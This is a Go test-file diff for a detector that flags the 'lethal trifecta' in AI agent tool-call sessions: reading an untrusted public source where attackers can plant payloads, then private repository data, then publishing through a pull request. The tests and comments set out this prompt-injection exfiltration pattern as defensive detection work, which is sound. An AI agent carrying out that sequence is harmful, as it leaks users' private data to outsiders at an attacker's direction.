+// --- Lethal trifecta (sensitivity-axis subsequence) ---
+
+func newTestMatcherForTrifecta(t *testing.T, overrides map[string]string) *Matcher {
+	t.Helper()
+	cfg := &config.ToolChainDetection{
+		Enabled:          true,
+		Action:           "warn",
+		WindowSize:       50,
+		WindowSeconds:    300,
+		PatternOverrides: overrides,
+	}
+	m := New(cfg)
+	if !cfg.Enabled || len(m.patterns) == 0 {
+		t.Fatal("matcher should be enabled with built-in patterns")
+	}
+	return m
+}
+
+func TestLethalTrifecta_HappyPath(t *testing.T) {
+	m := newTestMatcherForTrifecta(t, nil)
+	session := "s1"
+
+	// Untrusted-source: list_issues (a public source where attackers can plant payloads)
+	_ = m.Record(session, "list_issues")
+	// Sensitive-source: read_private_repo (private data)
+	_ = m.Record(session, "read_private_repo")
+	// External-sink: create_pull_request (publishes data out)
+	v := m.Record(session, "create_pull_request")
+
+	if !v.Matched {
+		t.Fatal("lethal trifecta should match")
+	}
+	if v.PatternName != "lethal-trifecta" {
+		t.Errorf("expected lethal-trifecta, got %q", v.PatternName)
+	}
+	if v.Severity != "critical" {
+		t.Errorf("expected critical severity, got %q", v.Severity)
+	}
+}
+
+func TestLethalTrifecta_OrderMatters(t *testing.T) {
+	// Sink before sensitive should NOT trigger the trifecta.
+	m := newTestMatcherForTrifecta(t, nil)
+	session := "s2"
+	_ = m.Record(session, "list_issues")
+	_ = m.Record(session, "create_pull_request") // sink early
+	v := m.Record(session, "read_private_repo")  // sensitive late
+
+	if v.Matched && v.PatternName == "lethal-trifecta" {
+		t.Errorf("out-of-order sequence should NOT match trifecta, got %v", v)
+	}
+}
+
+func TestLethalTrifecta_MissingMiddleStep(t *testing.T) {
+	m := newTestMatcherForTrifecta(t, nil)
+	session := "s3"
+	_ = m.Record(session, "list_issues")
+	v := m.Record(session, "create_pull_request")
+
+	if v.Matched && v.PatternName == "lethal-trifecta" {
+		t.Errorf("untrusted -> sink without sensitive should NOT match trifecta")
+	}
+}
+
+func TestLethalTrifecta_ActionOverride(t *testing.T) {
+	m := newTestMatcherForTrifecta(t, map[string]string{
+		"lethal-trifecta": "block",
+	})
+	session := "s4"
+	_ = m.Record(session, "list_issues")
+	_ = m.Record(session, "read_private_repo")
+	v := m.Record(session, "create_pull_request")
+
+	if !v.Matched {
+		t.Fatal("trifecta should match")
+	}
+	if v.Action != "block" {
+		t.Errorf("expected block action via override, got %q", v.Action)
+	}
+}
+
+func TestLethalTrifecta_NeutralCallsDoNotBreakChain(t *testing.T) {
+	// MaxGap defaults to 3 - insert a neutral call between trifecta steps
+	// and confirm the chain still matches.
+	m := newTestMatcherForTrifecta(t, nil)
+	session := "s5"
+	_ = m.Record(session, "list_issues")
+	_ = m.Record(session, "calculate_sum") // neutral
+	_ = m.Record(session, "read_private_repo")
+	v := m.Record(session, "create_pull_request")
+
+	if !v.Matched || v.PatternName != "lethal-trifecta" {
+		t.Errorf("trifecta with one neutral interleaved should still match, got %v", v)
+	}
+}
+
+func TestLethalTrifecta_PrefersTrifectaOverLowerSeverity(t *testing.T) {
+	// A category-axis pattern AND the trifecta both match; trifecta is critical
+	// so it should win on severity comparison.
+	m := newTestMatcherForTrifecta(t, nil)
+	session := "s6"
+	// list_issues classifies as untrusted_source on sensitivity AND as "list"
+	// on category, kicking off chain detection.
+	_ = m.Record(session, "list_issues")
+	_ = m.Record(session, "read_private_repo")    // sensitive + read
+	v := m.Record(session, "create_pull_request") // sink + network
+
+	// Either category-axis (read-write-send equiv via different categories) or
+	// sensitivity-axis (trifecta) may match. Trifecta is critical so it
+	// should be the reported verdict if present.
+	if !v.Matched {
+		t.Fatal("expected a match")
+	}
+	if v.PatternName != "lethal-trifecta" && v.Severity != "critical" {
+		t.Errorf("expected critical-severity verdict, got %v", v)
+	}
+}
+
+func TestLethalTrifecta_NeutralOnlyTool_Recorded(t *testing.T) {
+	// A tool that's neutral on BOTH axes should not be recorded (no point
+	// keeping noise in the history). Sanity check via internal state.
+	m := newTestMatcherForTrifecta(t, nil)
+	session := "s7"
+	_ = m.Record(session, "frobnicate") // unknown category + neutral sensitivity
+
+	val, ok := m.sessions.Load(session)
+	if ok {
+		sess := val.(*sessionHistory)
+		sess.mu.Lock()
+		count := len(sess.records)
+		sess.mu.Unlock()
+		if count != 0 {
+			t.Errorf("neutral+unknown tool should not be recorded, got %d records", count)
+		}
+	}
+}
+
+func TestSensitivitySubsequenceMatch_DirectAxis(t *testing.T) {
+	// Direct test of the sensitivity-axis subsequence walker without
+	// going through Record(), to confirm axis isolation.
+	records := []toolCallRecord{
+		{sensitivity: SensitivityUntrustedSource},
+		{sensitivity: SensitivityNeutral},
+		{sensitivity: SensitivitySensitiveSource},
+		{sensitivity: SensitivityExternalSink},
+	}
+	maxGap := 3
+	if !sensitivitySubsequenceMatch(records, lethalTrifectaSequence, maxGap) {
+		t.Error("trifecta sequence should match the prepared records")
+	}
+
+	// Negative: drop the sink.
+	if sensitivitySubsequenceMatch(records[:3], lethalTrifectaSequence, maxGap) {
+		t.Error("incomplete trifecta should not match")
+	}
+}
